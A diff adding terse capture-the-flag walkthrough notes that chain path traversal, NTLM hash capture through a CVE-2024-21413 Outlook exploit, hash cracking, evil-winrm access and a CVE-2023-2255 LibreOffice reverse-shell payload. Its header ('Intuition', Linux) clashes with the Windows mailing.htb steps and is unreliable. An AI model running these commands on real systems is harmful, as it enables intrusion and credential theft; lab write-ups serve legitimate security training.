@@ -1,1 +1,22 @@
+Name: Intuition
+Difficulty: Hard
+OS: Linux
 
+1) nmap scan shows some windows services other than the web
+
+2) web scraping -> function download.php allows to change file path troguh burp -> ../../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini
+cracking administrator passowrd
+
+3) exploiting the vuln https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+3.1) sudo responder -I tun0
+3.2) python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password ADMIN_PASSWORD --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\IP/something" --subject XD
+3.3) get maya ntlm hash (we know maya from the website)
+3.4) crack the hash con hashcat -m 5600
+
+4) evil-winrm -i 10.10.11.14 -u maya -p PASSWORD per prendere la user flag
+
+5.1) infinite research in the file system -> Important Documents folder got admin x privilege and as maya we can upload files into it
+5.2) libreoffice readme file shows up the vulnerable version
+5.3) python3 CVE-2023-2255.py --cmd 'command to get revshell or whatever' --output 'exploit.odt' 
+5.4) the .odt file will be executed by admin so just upload it to Important Documents
+5.5) pop the shell and get root flag
